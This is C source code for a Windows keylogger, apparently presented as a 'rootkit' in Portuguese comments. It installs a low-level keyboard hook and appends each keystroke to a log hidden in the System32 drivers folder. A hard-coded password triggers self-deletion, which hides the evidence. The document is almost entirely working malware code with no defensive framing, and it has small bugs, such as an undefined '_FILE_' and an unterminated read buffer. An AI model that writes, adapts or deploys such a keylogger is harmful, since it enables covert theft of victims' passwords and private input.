#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define SECRET_PASSWORD "darknet123"
#define LOG_FILE "C:\\Windows\\System32\\drivers\\keylog.txt"

HHOOK hook;

LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        FILE *file = fopen(LOG_FILE, "a+");
        
        if (file != NULL) {
            if (wParam == WM_KEYDOWN) {
                fprintf(file, "%c", MapVirtualKey(kbdStruct->vkCode, MAPVK_VK_TO_CHAR));
                fclose(file);
            }
        }

        // Kill Switch: Autodestruir ao digitar a senha secreta
        FILE *checkLog = fopen(LOG_FILE, "r");
        char buffer[1024];
        fread(buffer, sizeof(char), 1024, checkLog);
        fclose(checkLog);

        if (strstr(buffer, SECRET_PASSWORD)) {
            remove(LOG_FILE); // Apaga o keylogger
            remove(_FILE_); // Autodestruir o código do rootkit
            exit(0);          // Fecha o processo
        }
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

DWORD WINAPI StartHook(LPVOID lpParam) {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger, NULL, 0);
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}

int main() {
    HANDLE thread = CreateThread(NULL, 0, StartHook, NULL, 0, NULL);
    if (thread != NULL) {
        WaitForSingleObject(thread, INFINITE);
    }

    return 0;
}